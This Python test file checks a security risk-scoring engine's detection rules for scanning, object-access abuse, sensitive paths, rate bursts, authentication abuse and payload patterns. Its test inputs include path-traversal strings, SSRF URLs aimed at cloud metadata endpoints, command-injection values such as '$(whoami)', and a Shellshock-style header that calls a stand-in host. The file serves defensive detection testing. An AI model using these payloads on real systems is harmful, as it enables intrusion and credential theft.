"""
detector 단위 테스트 — 룰별 '임계값 바로 아래 / 정확히 임계값 / 위' 경계를 고정한다.
k6 결과로 임계값을 조정하면 이 테스트의 기대값도 같이 바뀌어야 한다(의도된 변경인지 확인하는 안전장치).
"""
import pytest

from soar.risk_score_engine.app import analyze_log
from soar.risk_score_engine.config import SENSITIVE_RULES
from soar.risk_score_engine.detectors import get_detectors_by_profile
from soar.risk_score_engine.utils import get_level, is_sequential_access


def run(events):
    """이벤트를 순서대로 분석하고 마지막 결과를 반환."""
    result = None
    for e in events:
        result = analyze_log(e)
    return result


# ------------------------------------------------------------------
# 등급 / 알림 경계
# ------------------------------------------------------------------

@pytest.mark.parametrize("score,level", [
    (0, "LOW"), (24, "LOW"),
    (25, "SUSPICIOUS"), (49, "SUSPICIOUS"),
    (50, "HIGH"), (80, "HIGH"),
    (81, "CRITICAL"), (100, "CRITICAL"),
])
def test_level_boundaries(score, level):
    assert get_level(score) == level


def test_score_80_is_high_and_not_alert(ev):
    # 관리자 경로(+40) + 로그인 실패 10회(+40) = 80 → HIGH, alert=False (80 '초과'만 alert)
    events = [ev(i, path="/admin/login", status_code=401) for i in range(10)]
    r = run(events)
    assert r["risk_score"] == 80
    assert r["level"] == "HIGH"
    assert r["alert"] is False


def test_score_above_80_is_critical_alert(ev):
    # 민감 경로(+40) + SSRF(+60) = 100 → CRITICAL, alert=True
    r = analyze_log(ev(path="/.env", query="url=http://169.254.169.254/latest/meta-data"))
    assert r["risk_score"] == 100
    assert r["level"] == "CRITICAL"
    assert r["alert"] is True


def test_total_score_capped_at_100(ev):
    r = analyze_log(ev(
        path="/.git/config",
        query="u=http://127.0.0.1/&f=../../etc/passwd",
        body="x; cat /etc/passwd",
    ))
    assert r["risk_score"] == 100


def test_normal_request_scores_zero(ev):
    r = analyze_log(ev(path="/api/products", query="page=2&sort=price"))
    assert r["risk_score"] == 0
    assert r["rule_hits"] == []
    assert r["level"] == "LOW"


# ------------------------------------------------------------------
# R-SCAN: 경로 열거
# ------------------------------------------------------------------

def _scan(ev, n, spacing=1):
    return [ev(i * spacing, path=f"/probe-{i}", status_code=404) for i in range(n)]


def test_scan_below_threshold(ev):
    assert run(_scan(ev, 14))["rule_hits"] == []


def test_scan_fast_low(ev):
    r = run(_scan(ev, 15))
    assert "R-SCAN-001" in r["rule_hits"]
    assert r["risk_score"] == 25


def test_scan_fast_high(ev):
    r = run(_scan(ev, 30))
    assert "R-SCAN-002" in r["rule_hits"]
    assert "R-SCAN-001" not in r["rule_hits"]
    assert r["risk_score"] == 40


def test_scan_duplicate_paths_not_counted(ev):
    events = [ev(i, path="/same", status_code=404) for i in range(40)]
    assert run(events)["rule_hits"] == []


def test_scan_ignores_non_404(ev):
    events = [ev(i, path=f"/p-{i}", status_code=200) for i in range(40)]
    assert "R-SCAN-001" not in run(events)["rule_hits"]


def test_scan_fast_window_expires(ev):
    # 14개 → 61초 뒤 1개: 60초 창에는 1개만 남으므로 미탐지
    events = _scan(ev, 14) + [ev(75, path="/late", status_code=404)]
    assert "R-SCAN-001" not in run(events)["rule_hits"]


def test_scan_slow_window(ev):
    # 10초 간격 50개 = 490초 → 60초 창엔 최대 7개(fast 미탐), 10분 창엔 50개(R-SCAN-003)
    r = run(_scan(ev, 50, spacing=10))
    assert r["rule_hits"] == ["R-SCAN-003"]
    assert r["risk_score"] == 40


# ------------------------------------------------------------------
# R-BOLA: 객체 권한 우회
# ------------------------------------------------------------------

def _bola(ev, ids):
    return [ev(i, user_id="100", target_user_id=str(oid), path=f"/users/{oid}") for i, oid in enumerate(ids)]


def test_bola_below_threshold(ev):
    assert run(_bola(ev, [201, 305]))["rule_hits"] == []


def test_bola_low_non_sequential(ev):
    r = run(_bola(ev, [201, 305, 999]))
    assert r["rule_hits"] == ["R-BOLA-001"]
    assert r["risk_score"] == 40


def test_bola_low_sequential_bonus(ev):
    r = run(_bola(ev, [101, 102, 103]))
    assert r["rule_hits"] == ["R-BOLA-001", "R-BOLA-003"]
    assert r["risk_score"] == 60


def test_bola_high(ev):
    r = run(_bola(ev, range(500, 510)))
    assert "R-BOLA-002" in r["rule_hits"]
    assert r["risk_score"] == 80  # 60 + 연속 20


def test_bola_own_object_ignored(ev):
    events = [ev(i, user_id="7", target_user_id="7") for i in range(10)]
    assert run(events)["rule_hits"] == []


def test_bola_authorization_result_allowed_ignored(ev):
    events = [ev(i, authorization_result="allowed", object_id=str(i)) for i in range(10)]
    assert run(events)["rule_hits"] == []


def test_bola_authorization_result_denied(ev):
    events = [ev(i, authorization_result="Forbidden", object_id=f"doc-{i*7}") for i in range(3)]
    assert "R-BOLA-001" in run(events)["rule_hits"]


def test_sequential_helper():
    assert is_sequential_access({"u1", "u2", "u3"})
    assert not is_sequential_access({"u1", "u3", "u5"})
    assert not is_sequential_access({"a", "b"})


# ------------------------------------------------------------------
# R-ASSET: 민감 경로
# ------------------------------------------------------------------

@pytest.mark.parametrize("path", [
    "/.env", "/.env.local", "/config.json", "/.git/config", "/backup.sql", "/index.php.bak",
    "/admin", "/phpmyadmin/", "/swagger-ui.html", "/actuator/env", "/graphql",
    "/app.log", "/main.js.map", "/.github/workflows", "/docker-compose.yml",
    "/.aws/credentials", "/wp-login.php", "/manager/html", "/vendor/phpunit",
    "/package.json", "/settings.py", "/pom.xml",
])
def test_sensitive_paths_detected(ev, path):
    r = analyze_log(ev(path=path))
    assert "R-ASSET-001" in r["rule_hits"], path


@pytest.mark.parametrize("path", ["/", "/api/products", "/index.html", "/users/1", "/environment-report", "/administrative-guide"])
def test_normal_paths_not_sensitive(ev, path):
    assert "R-ASSET-001" not in analyze_log(ev(path=path))["rule_hits"]


def test_every_sensitive_rule_compiles():
    import re
    for _, pattern in SENSITIVE_RULES:
        re.compile(pattern)


def test_asset_multi_category(ev):
    r = run([ev(0, path="/.env"), ev(1, path="/.git/HEAD"), ev(2, path="/phpmyadmin")])
    assert r["rule_hits"] == ["R-ASSET-001", "R-ASSET-002"]
    assert r["risk_score"] == 60


# ------------------------------------------------------------------
# R-RATE: 요청량
# ------------------------------------------------------------------

def _burst(ev, n, profile="rate_only"):
    # 60초 안에 n건 (0.1초 간격)
    return [ev(i * 0.1, path="/api/items", analysis_profile=profile) for i in range(n)]


# 주의: 실효 임계값은 docstring 의 100/200 이 아니라
#   R-RATE-001 = max(100, p95(50) × 3) = 150회/60초
#   R-RATE-002 = max(200, p95(50) × 6) = 300회/60초

def test_rate_below_threshold(ev):
    assert run(_burst(ev, 149))["rule_hits"] == []


def test_rate_low(ev):
    r = run(_burst(ev, 150))
    assert r["rule_hits"] == ["R-RATE-001"]
    assert r["risk_score"] == 30


def test_rate_high(ev):
    r = run(_burst(ev, 300))
    assert r["rule_hits"] == ["R-RATE-002"]
    assert r["risk_score"] == 50


def test_rate_window_expires(ev):
    events = _burst(ev, 149) + [ev(70, path="/api/items", analysis_profile="rate_only")]
    assert run(events)["rule_hits"] == []


def test_rate_counted_per_ip(ev):
    events = [ev(i * 0.1, ip=f"198.51.100.{i % 2}", analysis_profile="rate_only") for i in range(298)]
    assert run(events)["rule_hits"] == []  # IP 별 149건씩


def test_rate_only_profile_runs_only_rate_detector(ev):
    assert len(get_detectors_by_profile("rate_only")) == 1
    r = analyze_log(ev(path="/.env", query="x=../../etc/passwd", analysis_profile="rate_only"))
    assert r["rule_hits"] == []


def test_unknown_profile_falls_back_to_full():
    assert len(get_detectors_by_profile("something-else")) == 6


# ------------------------------------------------------------------
# R-AUTH: 인증/토큰 남용
# ------------------------------------------------------------------

def test_login_failures(ev):
    assert run([ev(i, path="/api/login", status_code=401) for i in range(9)])["rule_hits"] == []
    r = analyze_log(ev(9, path="/api/login", status_code=401))
    assert r["rule_hits"] == ["R-AUTH-001"]


def test_login_success_not_counted(ev):
    assert run([ev(i, path="/api/login", status_code=200) for i in range(20)])["rule_hits"] == []


def test_jwt_errors(ev):
    events = [ev(i, event_type="invalid_jwt", path="/api/me") for i in range(10)]
    assert run(events)["rule_hits"] == ["R-AUTH-002"]


def test_recovery_abuse(ev):
    assert run([ev(i, path="/verify-otp") for i in range(4)])["rule_hits"] == []
    r = analyze_log(ev(4, path="/verify-otp"))
    assert r["rule_hits"] == ["R-AUTH-003"]
    assert r["risk_score"] == 60


def test_auth_counted_per_session(ev):
    events = [ev(i, path="/api/login", status_code=401, session_id=f"s{i}") for i in range(20)]
    assert run(events)["rule_hits"] == []


# ------------------------------------------------------------------
# R-PAYLOAD: 우회 패턴 (+ 회귀 테스트)
# ------------------------------------------------------------------

@pytest.mark.parametrize("field,value,rule", [
    ("query", "file=../../etc/passwd", "R-PAYLOAD-001"),
    ("query", "file=..%5c..%5cwin.ini", "R-PAYLOAD-001"),
    ("query", "f=%252e%252e%252f", "R-PAYLOAD-001"),
    ("query", "url=http://169.254.169.254/latest", "R-PAYLOAD-002"),
    ("body", '{"webhook":"http://127.0.0.1:6379"}', "R-PAYLOAD-002"),
    ("query", "u=http://metadata.google.internal/", "R-PAYLOAD-002"),
    ("query", "host=x;cat /etc/passwd", "R-PAYLOAD-003"),
    ("body", "name=$(whoami)", "R-PAYLOAD-003"),
    ("query", "a=`id`", "R-PAYLOAD-003"),
])
def test_payload_detected(ev, field, value, rule):
    r = analyze_log(ev(path="/api/x", **{field: value}))
    assert rule in r["rule_hits"]


def test_payload_in_user_agent_detected(ev):
    r = analyze_log(ev(path="/", headers={"user-agent": "() { :; }; $(curl evil)"}))
    assert "R-PAYLOAD-003" in r["rule_hits"]


@pytest.mark.parametrize("xff", ["203.0.113.5, 127.0.0.1", "172.18.0.1", "10.0.0.5", "192.168.0.10"])
def test_regression_proxy_chain_ip_headers_not_ssrf(ev, xff):
    """[회귀] nginx 2-pass 가 붙이는 XFF(… , 127.0.0.1)나 도커 사설 IP 가 SSRF 로 잡히면 안 된다."""
    r = analyze_log(ev(path="/.env", headers={
        "user-agent": "curl/8",
        "x-forwarded-for": xff,
        "x-real-ip": xff.split(",")[0],
        "cf-connecting-ip": None,
    }))
    assert "R-PAYLOAD-002" not in r["rule_hits"]
    assert r["risk_score"] == 40


def test_regression_backslash_traversal_needs_real_dots(ev):
    """[회귀] '..%5c' 의 점이 이스케이프되지 않아 'ab%5c' 도 traversal 로 잡히던 문제."""
    assert "R-PAYLOAD-001" not in analyze_log(ev(path="/files/ab%5cc"))["rule_hits"]


def test_regression_null_status_code_does_not_crash(ev):
    r = analyze_log(ev(status_code=None))
    assert r["status_code"] == 0
    r = analyze_log(ev(status_code="abc"))
    assert r["status_code"] == 0
